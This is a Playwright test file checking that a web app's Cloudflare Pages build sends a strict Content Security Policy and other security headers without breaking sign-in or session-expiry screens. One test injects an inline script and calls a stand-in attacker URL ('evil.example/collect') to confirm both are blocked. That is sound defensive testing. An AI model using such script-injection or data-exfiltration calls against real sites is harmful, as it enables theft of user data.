// Release-candidate check of the Cloudflare Pages build (BG-LAUNCH-011). EVIDENCE CLASS: MOCKED (placeholder Supabase/API origins, mocked responses). It proves the strict response
// headers generated by scripts/pages-headers.mjs do not break the app and do block what they should. It does NOT prove Cloudflare's own behaviour: the static server below only EMULATES
// Pages' documented rules (apply _headers; serve index.html for an unknown path when there is no 404.html). Hosted behaviour needs the real Pages preview URL.
import { test, expect } from '@playwright/test';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';

const DIST = path.resolve(process.env.PAGES_DIST || 'dist-pages');
const TYPES = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.json': 'application/json', '.png': 'image/png', '.woff2': 'font/woff2' };
const rules = (() => { // minimal parser for the three rule blocks the generator writes
  const out = []; let cur = null;
  for (const line of fs.readFileSync(path.join(DIST, '_headers'), 'utf8').split('\n')) {
    if (/^\S/.test(line)) { cur = { pattern: line.trim(), headers: {} }; out.push(cur); } else if (cur && line.trim()) { const i = line.indexOf(':'); cur.headers[line.slice(0, i).trim()] = line.slice(i + 1).trim(); }
  }
  return out;
})();
const matches = (pattern, p) => (pattern.endsWith('/*') ? p.startsWith(pattern.slice(0, -1)) : pattern === p);
let server;
test.beforeAll(async () => {
  server = http.createServer((req, res) => {
    const p = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    let file = path.join(DIST, p === '/' ? 'index.html' : p); let served = p === '/' ? '/index.html' : p;
    if (!file.startsWith(DIST) || !fs.existsSync(file) || fs.statSync(file).isDirectory()) { file = path.join(DIST, 'index.html'); served = '/index.html'; } // Pages' SPA fallback (no 404.html)
    const headers = { 'content-type': TYPES[path.extname(file)] || 'application/octet-stream' };
    for (const r of rules) if (matches(r.pattern, p) || matches(r.pattern, served)) Object.assign(headers, r.headers);
    res.writeHead(200, headers); fs.createReadStream(file).pipe(res);
  }).listen(4190, '127.0.0.1');
  await new Promise((r) => server.once('listening', r));
});
test.afterAll(async () => { await new Promise((r) => server.close(r)); });

const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
const sess = JSON.stringify({ access_token: 'tok-b1', refresh_token: 'r', token_type: 'bearer', expires_in: 99999, expires_at: 4102444800, user: { id: 'u', app_metadata: { tenant_id: 't1', project_id: 'p1', brand_id: 'b1' } } });
async function watch(page) {
  const violations = [];
  await page.addInitScript(() => { window.__csp = []; document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`)); });
  page.on('console', (m) => { if (/content security policy|refused to/i.test(m.text())) violations.push(m.text()); });
  return { violations, inPage: () => page.evaluate(() => window.__csp) };
}
const json = (route, body, status = 200) => route.fulfill({ status, contentType: 'application/json', headers: CORS, body: JSON.stringify(body) });

test('headers: strict CSP naming only the two configured origins, no framing, hashed assets cached immutably, HTML never cached', async ({ request }) => {
  const root = await request.get('/'); const h = root.headers();
  expect(h['content-security-policy']).toContain("script-src 'self';"); expect(h['content-security-policy']).toContain('connect-src \'self\' http://api.test http://supabase.test;');
  expect(h['content-security-policy']).toContain("frame-ancestors 'none'"); expect(h['x-frame-options']).toBe('DENY'); expect(h['referrer-policy']).toBe('no-referrer'); expect(h['x-content-type-options']).toBe('nosniff');
  expect((await request.get('/index.html')).headers()['cache-control']).toBe('no-cache');
  const asset = fs.readdirSync(path.join(DIST, 'assets')).find((f) => f.endsWith('.js'));
  expect((await request.get(`/assets/${asset}`)).headers()['cache-control']).toBe('public, max-age=31536000, immutable');
});

test('signed-out boundary: the sign-in screen renders under the policy with no violation, and a deep link boots the app (SPA fallback)', async ({ page }) => {
  const w = await watch(page); await page.route(/fonts\./, (r) => r.abort());
  for (const url of ['/', '/billing/checkout/success']) {
    await page.goto(url); await expect(page.getByRole('heading', { name: /sign in to bizgenie/i })).toBeVisible();
  }
  expect(w.violations).toEqual([]); expect(await w.inPage()).toEqual([]);
});

test('signed-in (mocked): the workspace and a session that has ended render under the policy; blob: media previews are allowed', async ({ page }) => {
  const w = await watch(page); await page.route(/fonts\./, (r) => r.abort());
  await page.addInitScript(([t]) => localStorage.setItem('sb-supabase-auth-token', t), [sess]);
  await page.route('http://supabase.test/**', (route) => json(route, { error: 'invalid_grant' }, 400));
  await page.route('http://api.test/**', (route) => (route.request().method() === 'OPTIONS' ? json(route, {}) : json(route, { status: 'failed', error: { code: 'AUTHENTICATION_REQUIRED' } }, 401)));
  await page.goto('/');
  await expect(page.getByRole('status').filter({ hasText: /your session has ended/i })).toBeVisible();
  const blobImage = await page.evaluate(() => new Promise((resolve) => { const svg = new Blob(['<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"/>'], { type: 'image/svg+xml' }); const img = new Image(); img.onload = () => resolve('loaded'); img.onerror = () => resolve('blocked'); img.src = URL.createObjectURL(svg); }));
  expect(blobImage).toBe('loaded');
  await page.getByRole('status').filter({ hasText: /your session has ended/i }).getByRole('button', { name: /^sign in again$/i }).click();
  await expect(page.getByRole('heading', { name: /sign in to bizgenie/i })).toBeVisible(); // the BG-LAUNCH-011 requirement, now under the production policy
  expect(w.violations).toEqual([]); expect(await w.inPage()).toEqual([]);
});

test('the policy is actually enforced: an injected inline script and a fetch to an unlisted origin are both blocked', async ({ page }) => {
  const w = await watch(page); await page.route(/fonts\./, (r) => r.abort()); await page.goto('/');
  const result = await page.evaluate(async () => {
    window.__ran = false; const s = document.createElement('script'); s.textContent = 'window.__ran = true'; document.head.appendChild(s);
    const fetched = await fetch('https://evil.example/collect').then(() => 'allowed', () => 'blocked');
    return { ran: window.__ran, fetched };
  });
  expect(result).toEqual({ ran: false, fetched: 'blocked' });
  const seen = await w.inPage(); expect(seen.some((v) => v.startsWith('script-src'))).toBe(true); expect(seen.some((v) => v.startsWith('connect-src') && v.includes('evil.example'))).toBe(true);
});
